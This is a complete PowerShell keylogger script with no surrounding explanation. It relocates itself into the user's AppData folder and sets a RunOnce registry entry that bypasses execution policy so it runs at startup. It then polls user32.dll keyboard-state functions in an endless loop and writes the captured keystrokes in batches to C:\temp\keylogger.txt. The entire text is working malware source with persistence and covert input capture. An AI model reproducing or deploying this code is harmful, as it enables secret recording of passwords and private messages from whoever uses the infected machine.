# Ensure the script path is not null
$scriptPath = $MyInvocation.MyCommand.Path
if (-not $scriptPath) {
    throw "The script path is null. Please ensure you are running this script from a file."
}

# Define the AppData path and the script name
$appDataPath = Join-Path $env:APPDATA "MyKeyloggerScript.ps1"

# Move the script to the AppData path
Move-Item -Path $scriptPath -Destination $appDataPath -Force

# Set the script to run once at startup
$registryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\RunOnce"
$registryValueName = "MyKeyloggerScript"
$command = "powershell.exe -ExecutionPolicy Bypass -File `"$appDataPath`""

try {
    Set-ItemProperty -Path $registryPath -Name $registryValueName -Value $command
    Write-Host "Registry setting added successfully."
} catch {
    Write-Error "Failed to add registry setting: $_"
    exit
}

# Define the keylogger log file path
$logFilePath = "C:\temp\keylogger.txt"

# Ensure the directory for the log file exists
$logDir = [System.IO.Path]::GetDirectoryName($logFilePath)
if (-not (Test-Path -Path $logDir)) {
    New-Item -Path $logDir -ItemType Directory | Out-Null
}

if (-not (Test-Path -Path $logFilePath)) {
    New-Item -Path $logFilePath -ItemType File | Out-Null
}

$signatures = @'
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
'@

$API = Add-Type -MemberDefinition $signatures -Name 'Win32' -Namespace API -PassThru

# Buffer to accumulate keystrokes
$buffer = ""

try {
    while ($true) {
        Start-Sleep -Milliseconds 40

        for ($ascii = 8; $ascii -le 255; $ascii++) {
            $state = $API::GetAsyncKeyState($ascii)

            if ($state -eq -32767) {
                $virtualKey = $API::MapVirtualKey($ascii, 0)
                $kbstate = New-Object Byte[] 256
                $checkkbstate = $API::GetKeyboardState($kbstate)
                $mychar = New-Object System.Text.StringBuilder 256
                $success = $API::ToUnicode($ascii, $virtualKey, $kbstate, $mychar, $mychar.Capacity, 0)

                if ($success -gt 0) {
                    $char = $mychar.ToString()
                    if ($char -ne [string]::Empty) {
                        $buffer += $char

                        # Write to the log file in batches
                        if ($buffer.Length -ge 10) {
                            Add-Content -Path $logFilePath -Value $buffer
                            $buffer = ""
                        }
                    }
                }
            }
        }
    }
} finally {
    # Write any remaining characters in the buffer
    if ($buffer.Length -gt 0) {
        Add-Content -Path $logFilePath -Value $buffer
    }
    exit
}
